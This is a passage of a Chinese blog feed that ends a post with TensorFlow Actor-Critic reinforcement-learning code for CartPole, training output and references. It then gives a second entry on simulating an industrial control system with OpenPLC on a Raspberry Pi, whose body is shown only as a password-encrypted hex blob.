__init__(self, sess, nFeatures, nActions, lr=0.001):        self.sess = sess        self.s = tf.placeholder(tf.float32, [1, nFeatures], &#39;state&#39;) # 输入1：状态        self.a = tf.placeholder(tf.int32, None, &#39;act&#39;) # 输入2：动作        self.tdError = tf.placeholder(tf.float32, None, &#39;tdError&#39;) # 输入3：奖励        with tf.variable_scope(&#39;Actor&#39;):            l1 = tf.layers.dense(inputs=self.s, units=20, activation=tf.nn.relu, kernel_initializer=tf.random_normal_initializer(0., .1), bias_initializer=tf.constant_initializer(0.1), name=&#39;l1&#39;) # 第一层            self.actsProb = tf.layers.dense(inputs=l1, units=nActions, activation=tf.nn.softmax, kernel_initializer=tf.random_normal_initializer(0., .1), bias_initializer=tf.constant_initializer(0.1), name=&#39;actsProb&#39;) # 第二层输出每个动作的概率        with tf.variable_scope(&#39;expV&#39;):            logProb = tf.log(self.actsProb[0, self.a])            self.expV = tf.reduce_mean(logProb * self.tdError) # loss        with tf.variable_scope(&#39;train&#39;):            self.trainOp = tf.train.AdamOptimizer(lr).minimize(-self.expV) # min(expV) = max(-expV)    def learn(self, s, a, td): # 学习        s = s[np.newaxis, :]        feed_dict = {self.s: s, self.a: a, self.tdError: td}        _, expV = self.sess.run([self.trainOp, self.expV], feed_dict)        return expV    def chooseAction(self, s): # 选择行为        s = s[np.newaxis, :]        probs = self.sess.run(self.actsProb, {self.s: s})        return np.random.choice(np.arange(probs.shape[1]), p=probs.ravel())class Critic(object):    def __init__(self, sess, nFeatures, lr=0.01):        self.sess = sess        self.s = tf.placeholder(tf.float32, [1, nFeatures], &#39;state&#39;) # 输入1：当前状态        self.v_ = tf.placeholder(tf.float32, [1, 1], &#39;vNext&#39;) # 输入2：下一个奖励折现值        self.r = tf.placeholder(tf.float32, None, &#39;r&#39;) # 输入3：当前奖励        with tf.variable_scope(&#39;Critic&#39;):            l1 = tf.layers.dense(inputs=self.s, units=20, activation=tf.nn.relu, kernel_initializer=tf.random_normal_initializer(0., .1), bias_initializer=tf.constant_initializer(0.1), name=&#39;l1&#39;) # 第一层            self.v = tf.layers.dense(inputs=l1, units=1, activation=None, kernel_initializer=tf.random_normal_initializer(0., .1), bias_initializer=tf.constant_initializer(0.1), name=&#39;V&#39;) # 第二层        with tf.variable_scope(&#39;squaredTDError&#39;):            self.tdError = self.r + GAMMA * self.v_ - self.v # 时间差分值的平方            self.loss = tf.square(self.tdError) # loss        with tf.variable_scope(&#39;train&#39;):            self.trainOp = tf.train.AdamOptimizer(lr).minimize(self.loss)    def learn(self, s, r, s_): # 学习奖励机制        s, s_ = s[np.newaxis, :], s_[np.newaxis, :]        v_ = self.sess.run(self.v, {self.s: s_})        tdError, _ = self.sess.run([self.tdError, self.trainOp], {self.s: s, self.v_: v_, self.r: r})        return tdError # 返回给Actorif __name__ == &#39;__main__&#39;:    env = gym.make(&#39;CartPole-v0&#39;)    env.seed(1)    env = env.unwrapped    N_F = env.observation_space.shape[0]    N_A = env.action_space.n    sess = tf.Session()    actor = Actor(sess, nFeatures=N_F, nActions=N_A, lr=LR_A)    critic = Critic(sess, nFeatures=N_F, lr=LR_C)    sess.run(tf.global_variables_initializer())    if OUTPUT_GRAPH:        tf.summary.FileWriter(&#39;log/&#39;, sess.graph)    for episode in range(MAX_EPISODE):        s = env.reset()        t = 0        trackR = []        while True:            if RENDER:                env.render()            a = actor.chooseAction(s) # 获取动作            s_, r, isDone, info = env.step(a) # 执行动作            if isDone:                r = -20            trackR.append(r) # 保存奖励值            tdError = critic.learn(s, r, s_) # Critic学习奖励值            actor.learn(s, a, tdError) # Actor根据tdError更新状态            s = s_            t += 1            if isDone or t &gt;= MAX_EP_STEPS:                episodeRsSum = sum(trackR)                if &#39;runningReward&#39; not in globals():                    runningReward = episodeRsSum                else:                    runningReward = runningReward * 0.95 + episodeRsSum * 0.05 # 更新此轮奖励                if runningReward &gt; DISPLAY_REWARD_THRESHOLD:                    RENDER = True                print(&#39;[+] episode: {}, reward: {}&#39;.format(episode, runningReward))                break</code></pre><p>Actor-Critic 涉及到了两个神经网络，而且每次都是在连续状态中更新参数，每次参数更新前后都存在相关性，会导致神经网络只能片面的看待问题，甚至导致神经网络学不到东西。所以这里学习的速度不是很快，而且起伏较大，很难收敛：</p><pre><code class="bash">$ ./Actor-Critic.py...[+] episode: 0, reward: -7.0[+] episode: 1, reward: -6.8[+] episode: 2, reward: -6.01[+] episode: 3, reward: -6.059499999999999[+] episode: 4, reward: -6.156524999999999[+] episode: 5, reward: -6.1486987499999985[+] episode: 6, reward: -6.0912638124999985[+] episode: 7, reward: -6.336700621874998[+] episode: 8, reward: -6.569865590781248...[+] episode: 169, reward: 153.89380890618554[+] episode: 170, reward: 152.09911846087627[+] episode: 171, reward: 151.84416253783243[+] episode: 172, reward: 160.05195441094082[+] episode: 173, reward: 202.04935669039378</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>浙江大学信电学院《机器学习》课程<br><a href="http://karpathy.github.io/2016/05/31/rl/?_utm_source=1-2-2" target="_blank" rel="noopener">Deep Reinforcement Learning: Pong from Pixels</a><br><a href="https://mofanpy.com/tutorials/machine-learning/reinforcement-learning/" target="_blank" rel="noopener">Reiforcement Learning - 莫烦 Python</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无监督的强化学习。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ml" scheme="blog.b3ale.cn/tags/ml/"/>
    
      <category term="rl" scheme="blog.b3ale.cn/tags/rl/"/>
    
  </entry>
  
  <entry>
    <title>Raspberry Pi搭建OpenPLC模拟小型工控系统</title>
    <link href="blog.b3ale.cn/2020/07/19/Raspberry-Pi%E6%90%AD%E5%BB%BAOpenPLC%E6%A8%A1%E6%8B%9F%E5%B0%8F%E5%9E%8B%E5%B7%A5%E6%8E%A7%E7%B3%BB%E7%BB%9F/"/>
    <id>blog.b3ale.cn/2020/07/19/Raspberry-Pi%E6%90%AD%E5%BB%BAOpenPLC%E6%A8%A1%E6%8B%9F%E5%B0%8F%E5%9E%8B%E5%B7%A5%E6%8E%A7%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-07-19T01:16:42.000Z</published>
    <updated>2020-09-28T10:00:34.000Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password." data-whm="Wrong hash.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Need password...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="db8be89a270a0ccb943e9cfd33a14815733ab081c357a67d3283a1672d0a5c06">a8e6f10f7a8336f7c06218f908b93f1c854218a316a57c3d8dd765023a20368aaa49ddeabc369173048b39cced0faa696f4fd812c58a01f3b1a5d9e50cb24e3b4e2ef409e89536ef26e52d3bc47d7275e76f609d05ebb132c0b02f99bd6a6cdfb00f26d5c308bff7a80ce786107a2c9d0ac643a9dc6a9dbe046441c14b0bf48550dff82780d5940c839ba164df5257ad9282d5282d5c96e91862021c162955376096839a6ccf2676dc905030f69d2e489fc0871b872dc5ce708377ce2035fcec46f46cceb4e82be9fd468e4b6af46eb65d4d2e150bbabf61e7a6500c4b92e22b94b97851aa75c8cea20a7957b00fdd8d6104b7926796176e873554a0814509a99ae000756733b8bafca283a273037e5fe2274ffc07caa15bbc27d41ed5191b209b5599824c78c7c5e7fed501919aa0b8499ceac870756bd11689b3026d2008e37266f3bb997270b53ad658a8ece642b9fce2fb568d6426bfaa16076df020341de46a4fb583fd0d90dacadb6459ab2454638f4f0f0b09e47fd77eaf9bc812e78e6543f7b07024faaa6fea0e51135e95e4036b19b737793c3001ffa034849666222315c582d8fb602a25eb9cdf81e78ff70e8339b2d4974da7eabe234f5e36652ce85e76fedc0f9c8d7edc5053f30f7cc73cb5ffcf2823adf9b55b2f0dec37a8c2f8c5b348779c06a28d405047585c24aa46baacf2eb557badfb42800567d1d538023da0cbff09ffa2487866ccfe3f4d0ccbab8ff3b40d2ba378e9bfc3935d544e2fed2897e57f4139ee282bcfc888d6bbc2e05718d8d753543de0078d45180075efd442b7bd8272ca2e133f5129c8bcafa9c0c8f3ce9dc147bce00bb664eb1e8e9580b9e5ec485bcda87c568960ae41fec0b7601539fffff8868fb2b3ce2a8bfe08f87930c15d6cdce59a35fa3f1d315a4fdbed2db2329c2b972228f8f4d7f09de47bf2062334e43c8b8db271a283c9629faedf9bace0d163664a5b561ccc251ddd242a6e602c886dbce07389c5b7fc56325a3f4583f653bcf5f86e50934b03121dc2899a9efda45f87dcd68441ba65066e13ffe9e121731a7041c9a3a1ee19647a5d62507b3dc69ba3f7d8148c37aa672321a33ea0c51a7219ad6022d62b6c88680577d16a78c72250b669bd35940dd60f3968c4cceca415e5bd7dd7a0cba31f6f7d01def8a6ffd54678eb29d9237ddcc8a836b67e5d3d3e7b4c43706217a0e58736b9bb5e24c24b05d9ebb89a22c3ad7a7a9179089c6e038c3dbaed59c5a60c29ec0f1a1f1a048e71bdd8b02eb14dd167f60e511ed21952904d04b8f8a397197785a6f266fa479d0325ae4d4642b88c56fba6a18e3d07d06e82f3fc7a863c6f921fcf022dd87c32817eba98a79af065f72a446d4912f332ab374cacd26c8cb084ae92ba1faaf6f2a4d7fde822673970d4696ed972a1351d241e0e23a7901d11354450ec17280720d2e3416c6b381e16bffc9cdcaa54d377c357906a292ea3d45dcd5242fbb734835b0e02dd5ccc1605d94dc3580271b6bf4ffbfefc978ac6bd446482b1dd8437a882d453cecaaa4a9e45ad4499184e2dfdb747e1519765f9d29dcbe103782cbadd848d863a93300b836451cc0c13814bab3a685ac32e84d1e28327c0a081b8413c57fcd2fa1fc62d3091dd1fc8e9f8ea245357878b64e5be7890bf609692533e551e6a8f35fe6f4a0438bcdfecd3506824ee2426f09e4c11320ae78c3eaa434c9412b7d0e911305e9ce6e63e141eba3be1b1fefbb5e05a1f5ca520b431b9a2d9b3becc652c343589a44f926efd0101f12df722c727b829f67531bbbaaaf6eb5e417fdc75fea6292a151591a3fd3bc8fd6554ad276a4ab8a425418134d7b73a1c4d905dda9e7e45d2630b4a17b06cf06964909416dd1facb9b0749336d7b61502fcde24d429b2489cd4c844a97c79a63b0ea0197c0cff5e8e47dfea7ff5a59b1687d77ae7977be2e67bda8cee9f6d81c756d5acb8201e7aa1503da0b40dd7e2e12b0c147361ba6150dde0a6facfdee64b001b57e1476167a7058e5f6fd3fa043bef4755d2c312b7ebdda90d17114b537eb144a67e88a3d60676f49988bfd6862f4ca993d5f5caa83e5e5c0950618091799daf2e9db79e2c24e4f5a639ab0c1bfc5bf4eccc916f797cfdc54040a38310a929238cad19dd6d2efa1793aadaec6abfcae60a6fc98d0326246c0d144883e4c5ab61550f62ba8bb5a7e9f8948e6ace7fcbd5bbe3214232e01d651ffaf4afde143cfdbe882e516201b5272c36316a2090c99c37ee82746483245d7ecede8e66cb8830a5f3e07536a3ad16a97a847ef6d46d86e4ad6b2a49d0daa86c79463c2f4355bec347596edc16f20750d8f4df24185b0cf242e3e636912a55f8c69f7810ef90384935d24bfcbc8ee817732807fbb50d21a801b6daeb01cef5cfd3076346355275fe009bcb74852459d9fc632fd1a78deb24346f1b165a2dc4250899581bf250c36cb37e847ae674d9dd9da20c77d335bb9b1fa46f57746c6d8271816bb6540c17bfa71d306cff653ad8735e3ee9373f833011764c1a3b9cb120794aa3316917b27b3387b6c73a29b3781f8fc1e9f6ae22c76bd6aa4601d4a5d38180d0a94b702428d66a827b18b7cbd1a1fd90477144ef880a4f4efa2eb2b19dc57b9aee3fd3b88b466a58c79ae095cdb74f2581add09481d5a7310eeac642662fdee86e6ba731f717f040b8f89fbf706f8c3da0971dccc7a7096f293c213cd7eca875445ab5f2e1c89cec79b1eab3f3525ed318354831aa4f21df24db142dcb0dd0cee7e135e1d215fc9fe18719799861f927f493a9ef3bd28b4b27cb17dd451096c4e43d1258564eb921fd79f803977db9dd1f02524defaf0c9eef1690318559c0b3b608ffffe1cf8bfc1dd3f7814833a3c15e07854136982e045c4789979423a6a2aea61050b67017104709abe1dbf7fcb7b8616280a8146051d99cfb3c896e5d3171a580a7a1c2a0d0e3ba8d21bc66b9bdab31a52277e4f992da8dce3e709f615aab7de173f69d848c772cee31e7550cc56e86b9644bf8b92d1ae786f613eb854bb593d20254b15d75469ce1889e1a60eb644127c68dfcac99e2fc240fe7a2177c799f89031ffc019b92fa4012caa80b5d6bd0d03decce866e368713a7c15f6d7f8a152adaa92c6c087dee0ee2322a555d40c20875310f7cf91b9e128c18750c1cb1a201278cd24b8cd4c5f5e304b423fa41eae0e58803c34e84e2283303bb984adf78ea128f2b75eb9a80fff167cf745d1474913f3c748b1dc966c0c85a81d2f9ae7bcd083a6cba26138383572e6d5a4a90338c6eedb14ba8f9d037624ce885d248ff92fa89767bad06bcb1dc25c69a54951651037bc556b3e32aea6344525a123a59ed2b3079631aae968ed78a4402614114f173621599233a8968bb3e70780e96b42a05ef79832ede217ab70f48a9e2d3c57c22ebd71046efb6d7853b3e7bf62b9d0e49314652f9ec71fbc8a06dfaf97c0fa082a8e77f11222b543c886e4ecb5c0e110231f6de7c9bccde0b1e1ce9091ce0be2055d35962401d1f78a53db4a157dfa4f042210b48789ca2f2e6833608980b576b795305423628463c50f575a12c237d8bcaaf99292544c84a2cd19f56feffc94448c7d645043c66c65d5cb76407d73fedb359cbeab51232ee1f2de701f4c4a1e88727157a509a8fb9bdeeaa709aa0064912fa846282a26d5b00615d37093973347d4a9f50e573895b7aadd2185b9694bbdba290fa3da31c63c1bc04bd05f343850a9acf10683714d18a3ac6d041bee3d5b4e118104111b79c3c7f27f450b434055d5292aa7c082ad71ed2c82c3297e490337f35106cbae3e003544ce901124b7a9bdac95f3dfbe8c6b053ae517db576cad09e7893da1c8cad3a04a1808ee3a45a36f915511c8424b9c3d497b4c9d5740067f06d08508cbd1df7a379fd01d64eaed213a52604afa2ad023ebcf27961953fcf33b73bde122a5fa3239d3ff252ff506cdcf4946c6c5d5111dc17cb0690b1d08ebee79b6625e5e42b2f4473b1e2641d89ec0941d755629d889f8a0ecd5f95f04bdc6b1f926831e00531acc9d686605d81eecba752e348a685771ec111f0fb661f3d71051f3d5f1a03b9f68e9f4582f343a21478be27dfb4a7fc6b361df18db287646ff27514d9d6b8997509683737a994594bb83ff5deae364c71eae2b01cc1bea627c1205b7ed347c34af246b555f7fc798d457bb3eeb52a2dd495a0cc75798621d7534d06747c8a3417fbbb77ad5dbd68c198e91db7d098351de7071b469078a1671f42ed36d9524d09dc96e7f40a7cf9e65f818c2f466fdd98f4e9cbcb83dc265df23297e31d59412e1526a9aea952c1bfdd037d07a753f5122eeff073cf4cc2ee059f5a3c74f2c34852642f86ed4cdb7c3772dcd179383b7842fa1152aa7bc5eb0b8c357d56a1400428fac573fbd14d8dc3c8c4d94e3e408c1ae02576c1ad1e89008ec48fd0d2eaf3bf3957c62e39b2f88774b5d8d66a66045ef485b799e75d7893ba341e117a443c2097fc113d7d9b6372dc2d86b2779f20eb49825c0e18a704b89651458a1f91f38433c4944df69b49ea921e9ee717c90d7605e1839d21c03bf86f09e546c4965901d408894628aebec70fb395b805d68333b4c2f44618f52754a44adc3c2fb9f7ef9deff01d3a242106d95edf737474d7f73655ac5327524a5f24b31f3712cbe5144a906730207391c0cec37ab2d566b60f5b375c16377c9f36f43935bb6f518ce524017244f0b98c08c7e48ef5ba3938ba56730133b1382604b75955273702e323eba19ea605f81ca0969c669af86eb5f364806a0649a59fa98680d0e35c8d7d95e704a0162922b739bb4a10d5e2fd478155c4f83ecec6016b227ddeb6b88c760ac8572b601c288b87436cf9a5c91f4c11e61405931c6514018cebd78076d00c0c4c2d867741fc5943f0ad81849cf75b13c54b7eb31d47b51d914d22039d96a065c9d005c4b1a1a138b79c392af7355d743eca7363f05bfaa0135cd258992523eb2001e1d30d3dbbe643d8218f9599e3b371940d21586f3bc86b3fed51be153af47be1019526cf0f0a2e41732122d5e1ca70cc70284e92ad90eac16188c9cdc54e1e9506178f6c71d68ccc46a103e7cc6414456196853d278e72f010088d81c6aac91f1a205f0830e5cd2c201223c87dc3a3999e77a8f70d9f5b57007cf26e987e095b596376e62231eb383cf25d1b514024ae86dc477bdbfc95e5699e46f9c47f6472836ac02d95b54c074c176910ba12dcce4b733343f5a32c081af78d21cdb5c90130ebff6946275a03893497eb38c39cc912f68f1c4dae4bdf1ab4aad827d5706dc3eb37bde8fd55ba65e21d7cfef104e62ab0cbce3ff85a320f02377562a09698ea2541df58358a34d637abf73c4ed283d644b44d597ec1f9caff52a3fb9071d0278533f3f7fbff4fd45584e940482c9bf70ea6c6d0527ca1d976754ec81e4ffc296ce1ad6fe4f479c0254ff2815e7b8535ddf8e48d19131e929d0c89adc8c488973bcbc5bd6120e4c27e536f461a5875fbcadd3363c0f8f31f70b29184129ed7167df0139787a2c4d93edc4d4ce18bae05cb33ef470766ddfa39fb26488d9a364a52bd2cb1c2967175ac410055bd1ca39977c2e6376cd62a744806d2ec1713fe94cf12ac38c89c4dab2d297084c24d0e700b9f28fc359f5d170fe49feb696c49de2f4e8f801daeb6994e255b9117104034c82ef5da88f6637ca68de8a8564e0330e0d91f7781c3d291e458814ed765294f553558e8db0dd2b5b556fdacb19c90774a3ac65741129222531df1d0b55bfcf081afd05bcfd8028579d11be3396fe1d5578f13f4e3da982979f54d458dbbb7731921c8ed70a292783faa36f62fc1d2db06198145ff731c6b47fff024b9ffb788dd8a0c3ab782ed90824dddce57ce0d30c8634138986cced77b563e191b5ea55389756f7a89c3b3125b11f4b646b7b6b92d15aa961c659c750323bba463d4325e2860f39dffae573e38e1f95ebdfe46bb4b1bbf69476984bc87df751be1b3798244f1ebbc7496f4df14198840f33c939c12b3756f18c5f329720d1b7a059803d0291a53bd92e4078c8e92ecc9e322b5cf7eb149e75ff0c955db05cedf438b4280df6efa0ae5b9e5091d8865c2594938634a92f57ce7348e3f48006c73265ada07bc51fbeb58ca9d51af07887553b74d587cc7cd8d66f8cc1053b7aaf30d156448e2e601d9f31bca85d47335d45a580e28158971f977dda0b9d3c75db57e7366517c55cfcbfc6b4b40edf1e86a64e08693a9fdcca5c6fb10f16b9a4366e213800e4c6b48f7f0f43d0f34fe77f40f467e5fb323d6d7039644044282de12a6ea905bd0b174f3b52dffb996891ca4914faf56c013ce0f2fe5003a48f27274b9c74c221c613a40304aefb4c56d9ddead7a386d7622b4990cba5065820f4f526d4519776c09675555e8564da5729e8f0cf24740205bd119553e6f7933f6488fd69ec727ede2c36ebd9e8910d9f3ee96d49219468b5bcfbb4c9169592564c18a3db3c66069f29c9bb370e938be4816fc38976da39097070bc2f0967572b39d2cbd43250734982f554ddaa1e8e360cc173906356e9d3eba63bc3976bb3e1ebed2ea5cf6983e2a23169635a6d93d20c690862df2f539a1a2b3241e8528521fb7b28ccbd9b9881fa139f48b8a31c5bbea0db6937ce083119d476859deea6ade790162998865bd2c324ce24997172fe963fe554794e5b255dd5bd057571f91fa4f6154c4364c063c202a674f8fe9d7ee14207304a194fb1cc5489619951029c8b5940b7f1dd2769bfa329b0cbd229be8401c8b5ed08b004bbc120a167f5257920c59887511aefe838536a55e6a5d11758071f5c13a56b28fb0f7c501090ca9efcfb4fb21533cd04d048d8745cb549227160de997664b8cce5cbae19906a232973251195cc5ee288b429bb4eb8a771bdd527a67b5e75de08e5a343a2be581213844fdd6467596dd1de8dc57073e1c3692417f239758344b4a63cb94e4599093114a7e1c79611bf8f0de89b669a22290a24f600b2698845b2a0567ea09adb2f32b7a9891700643facceab994bc6e8a560ccf6c37455555d91ca5540c5335df8ac8b4fd3c678659837b667538db51a9570857e4b1d510c2c2cd2d4aaed8d54f3605d11e743f726e27e4aef69c9aee0ceddf4a8f17aff037667cce7a3b5c159800d1b40275f02b9fc08de44e728c3d95d34741ffce939446bc684c3d80ad70365d1ecd6194333302c240dd3b813fc6410d87c42e7ce8a666b2471e5e9a61591abf7e7d82d2b5bfb96d0baad690887ae16ad083d9868e5511d8b6f95c7cdeb8055aa61eb5323a29386bd34a41ff260741235e28b37adfe8d3880f0c235106c0e3d873584f3d488fa080737b1e1b3c10a3528d45979abf2dfb4d04f76b7e34197a6fed61309f10a0a403a90c2948203be05a5e012adb8b91475b48cc3e362cf093f93897cebed62c1e3a40ae4e3087d6fe60c72d8e4ee2a575775ac61e07f47b74e40647253a5ebab80135155f2ff3a5b96d9db2e90db97af4328ac2dda75e30364ccfdcb835747d4a9c4bedb633f8818d4f181908fe732c5008c27b87ed5f05f727585c8e63d4edcfe3a2142a30c0090f6bc9fc4265f5ea12ca747d6c432957ffb0b9c80741638a742f300cdcd9550dbc01db3ab1c47a674e1eec8115b658c4910ff8eb616fcb423354b24cbef5d61c436ee1d62d4aa84461d809d9a09ee7c5c52ae04b1d80d26956fd7e8fa2d1b49df869a6ff9287b7757f14de18d959a5bcf18787526503db32c1eefd5ae9dd371689500c8f7c98d731fa3d6dac9170309a9e2d8e9f1bfaaaf1dc9a4b729a73a5dfc915e3bf1b7b7235b7892ec489377cbee9c7297db81e44fedc69d2fe79503d758de24bb8a8ed6f3014e7b475c13c8310f2cff434a5401b8b4deff7294c0d86fda7683d96d99600ba7e5dc9dd6abd15fdb3cea31dc0ba8f8778e440d5d805affd082513e3e7df3ea5629965b0c3401db336e89910a2362ec3e8fbd7ae393882cfa4a1fcbe884958d4cb05b5323c571cdd92620d140eacd1c4d86b44981945eb10809e219a1519f3908d10c56871eb905e8d251e3bcfc6598c665ddb872b45339c047d7ad834906fdbf98b04eb166bc995ad9dbe725c0fc793d0ee2eccb709bef8eba3d74e09dd2e39359b5f6fddda485d071ef656344df3f2a195ee6175464f8680436491cc0114014d8b3b51802c88db8d6d86725d3865ae3d586cd9f6294d7766fb42e73640653b68f366cdee91c8e118436ed1f305c6bd1d2224eb7947428f6b33cc2f92c8be533261b664285cd4e5e6aba733d01288bea153bcea5b88ff790855465e98f740cd7fc958ef1aefd8ecc7fddf09d0651c7d941245bd73b5203af8419bfaeb6dff7f31e8425ef961491722a005d6206297f2f2bdb1c5d698467d530aada260e776bf7b80a28ec64952cfcc82047e3d7f6cf70d7f32d87fbb57706671daae59b276ce8e68356109bf604947807d20ef82827794f03ee00b8eac58e288cea351893ee361be0f7207144f221684a4fcca2cd2c3d0e1300a38aa87f40afbe20d442ebd345f5d05fc8fc2c0fa49600accea871c52072184e4419f6471a9e79cf169f307492df8ea8462ba245057905899e003dff3998eee5976e47c73706048f770d66334fa65571c0114509c8d1a3f9b3995905dbca446135f06d316dc70db03856d499406b2d3d6eeb0be7d4a2bea325c8a0b13cea4be150df036891ddd6ee53dbdbc347ad3a26dc21a8b3392b11b66f8f0f0f8c860815d033243cc12b70058ab65e9ec8de05abd8019e304d7695092f8c7639380503e761be5fc16428d2535b669cecb6ff459b23199a3bedddcebf7ff917046c74b750cd56a1d255f7d19bbabed32233cc76105527285d832f6b79937d1ddb21849fe4196040b3af767e43c1886820904c534ed4e38271a32750bda52fb6e0c204de84e977832338d32f85f2aa4ba03b661dda930486a16cfcaf89f5a569cf7477268ad5dc28ac4331a7725fea730836d4af7e7ee813772c9921d03692b7f0429cb578fbfec9f0334d59d8508e566b24284c0f5ff335d10739575749aebc69df2c0fb4e5ff7a1d834d95f3227170c1c55baa2ff3ffbc43f675e3b53618145e7c77b0c5f32fb605426b0bc8d1eed35d13fa45bedce63aca4073ffa5c350d760d8aee7a06aae557a9c121756c0771e3a9f11c7e724b3a4c7e40a14da9d2a9b2bb463ffcd669dcf2bf8b56335664a0912a64c1a2fee796b4bdd89875957fdc448adcc2cb62c3943b7a936c0c37d6d4d43e6fc74c140ff77fd60a9c785930ef1a06e01bd5c87fc1bed7271cac62edd96aaae7b2548602d72affc0aa445f2b41f052bf9b873057e66f932e241016c71e1224843edbeeaf5e6aac6d62eb0a9326cc3d0422c2f272299b39ecca5ab7d7987d0805bba24ab3ea5e7151740721f826e7c9f3b06465ffb744dfe0921376df51909c302ab7fe5e38c246c02f8a2100575f67d50fd1830ced832492ec069a0591be466c650db6197a15862611c00c63b93d104f3319d060fea4bf3a906be963031482dd04b865233e8dc13e4b8c180cbac974dab8b2f60820c5992acdfb513e3accd9014ed685b3c151cfd042f98a0501586014473b3108dc1a8c298838208f5d6be42271efa9a047abab9e633f7ed6566c8f96e9c40878fd15fafbc721e7cea3128cfc514115dbc3a4a6dd2d823faa9c05ff54cc95ffa2950f08dfe6e11842073a792710deec6df6aeeb72b214f6d0c32667f2ca3a1ff7721406e110c8afbf96eb9c19c9d71ac92d28bf1840ebbd5a354b89f77bbe35e804b3c5dc00a158ffcb3e175ae0e577da7dc360e2e3770053e2a86c864202426c28c9697e9c467474c2127ebfb7d0e05d5ffc5475aaf0bc1ac3eb2661c5bfd8a7c225daa974b4cdb4819d0eea69224a3ef0451149c46b22f9ff5cddd7bf6d03cd53b9c7971d36f3b55f6730b8d80b990da3fe835bc9f6d0bdafc3eda81bdcb94a68aa321cbba4df22196f49560612666dc43f646423430a9042fb3e65361a349a1c35cd816e16d3d92bea942946d860c356b570fef34d3646756f2bbd70019e0573dfe7091e306bf24223b0db05237d097eb092cbec5e0cd583bc163734ccfa793a560569a0f3a7759f043a2e7f91effd739ff000ac0f277694cee30f66c6fa2d2cdc25121e3baa9c6b975d930e70d0c392c669e4a49ff4361049c370f7416ef93dc6b401585c4bedc8c1db97db3e7ccbff6f49435c3b29adca7d76c11d4758b16a04619e45482d3b711ad2eacc408a84d99df78a87dc44756df4131c793999f83a1735541643f413d7a854d7cc661e6a9edc338dd12cc02195338f58963f053bb1d78b64ebf8a7ff2cf2693bfed52f79a07033df87a6c8674db291975970731ead33694de7c1271a664dde49a229cc97ecb503c45e367c1e5029aeabf8f7ecc223c98311c156fbe332374cce534baee8d39dcacaa59432cbd23df2f1374a42383d1040d89a9c3693583d0d7956bf4853bf97cd803b93f99896b9b4ab2fb07545a3efe993c6ce3d08e4f588483be7b5c8879c54228eb572a5ff7e60bea4f41f8bbb1efb5dd0b11c444dcbfda0c32f6cfffc0f4655fa99ba513ab71b80959098b796153ef7554c81f3c275b2af65747b4c99e4cdd6284a956b81889f89800b19c01d0071d38ba4c2ce177e93cf288f9a2c52b9be66b5cdf51ddd052be2e300d76d87870668b4912591bcab8c9f440f95c2aaa1ac99e6219aae7492c80e0c29a90ce476a3e286d6a2fb6c1d678f93c1878983a596dfc0e9e661e92614c55307da618e54d53da5c49b0d837fac766e238868b8c950cc354a7cc0d5c9e8447978a04bfadef7f0779dba99f8cb373baf10b5d71dec89407534886aaa15f668feb6060dbd06b4c461064e38cec6646311867910c0d94f5e864faae82e45ba8ab76c068b57a0c1296ae245d2b6458d0af8221374ae083627210124b119ddcb5621835b93d85d0ffb673dc4d46841569d2d06624eeb33723aaab1d137e13759c9f25d888eb24518c22bba309490b2da7a3f2edcbd11e5fe4550bba567949fd5cd9ff960c9b253e8ece69495627493180e0f2da9943cf62adf469b900f163975e07b53578aafa84c618240ec7e931ec48c2ca33c5337ca291859b4470f74abd76c8f914c74d98f41b02f552aa17d87deeceac7306a07e18445aff8d6ef7b1f128a3cb99b1b461fe44d7cb667dadd530a7bc620835be4402f5e05d37ddf132681313cb0291cc701cf20bfe37af77c99c929de743952808bf5b264d4a0f4e14b6bb86c3ef208118455e508f6af80179acef34b1658e0909e255ef6c7f6f06a1ceb307bcf5bdb07da5613108f839e7c851885679e9c9133d09d8f1badc7f78d422a192fd92e4adfaf9833432d5e97f0b71dac2ca405b506fc908dfc15abe219df5a5202a9663650a3d0c82febdef30c4df5a0ca2837b76c238f6cc58b49774e9f8858ca67cc69d2c5429148180c00b322e75c91c324853dd57336851c55b36c6b0698a990760e41e125e529fd31f49f3ec94bbfbd77bfba91ec56ea50fbc4502e2793950f15c270bd877d8bd0f5428b66eafdc27bb446b27fb1e2adf49a464a9332d8dcbe91707a8510c17442ceb9168df127a20cefaa253cc0e66f6032023c413cd6307bbf3c27dae5c605b1618520281802414418a32c0e2611d77f98d38a9d7722764a470cc94b3687f6b264a7b82293a9eceee4eecc534e83d8e835238f5598dac96bd40e428c2d00f0e689e0d90ea63e40858a64519374140df571bb7a22a780e5bf865834d5e4fd23a1a7b0186d8f071c3833365b9af6c98d64ee7f11462794bf186435e6adab3e757de86cb0b13ca49c8edc42ffaeb66e782989a1588eafbb95b1d9b2e83950942a0d572657c0a0defdb57c6fb5313405bc25977b7e628bdf1564ac6172d820e98030a115825b3580c8f171b88edd3e4db970b386be71299560d6566f3fc08507c706a2904df4845c4c9cc82de8ebcf89b0c4215ac681d6a069641f3089d3703570212f8077c781ba37926800320f6854bb4c95444edc43317c7284f5bf98525a25bdc6681612ae58825f4013c7f6a224888bc38e47c92a6d847ae8196b5fef3ab4c6bc0257e132442e659daf86aef384e2774fcef6464fa4d37f52dc7c0130e9e7e8922edb7e3057e514e70b36ae751b38169103dbc83eb0cf7e03ac212339de50802179c5574879d3ba1dd80083cc3a77db6744b63652f8b21274f4969295dd041ee0f840d216bd2ba75de74f18fb5b4d86abae2a625d7e6197ad3034ef3b87aa3b028fbddfd20cc63b745c95d8032f1b01a6b9b58b78a5792cca75a57739aefa91db7453a3854d0e16178fbcce8ee0bf936cbe5944fccb8abc9dd8f49b8696785093c5ee0b186355401079991cc7401f1902a0bef3bd169d8546f27cc16844ac16dc0663d0f50072b701463d10de6b00b193f8eb0f17e37ca4616d5ed497a7f448b39c679b6ff0ec914248fc69ad972b28a27bc469df74deb8d7c8f480b8b25c566b6066c563c871d9c5c4ce891409ee7a87b6e315497d1b20e9d17166530b21005c7ca7c739b3e90f027514cd2ef965a033fa058be15abee4319e47a28ea729fd6cf236e6d3ef48709152753bb1bad76579a701810083e6bd01588d6505bc4569d27eff6fd438805f6186a0e66d360eada0fcf6a6895ef7a0381b6fb23adae3838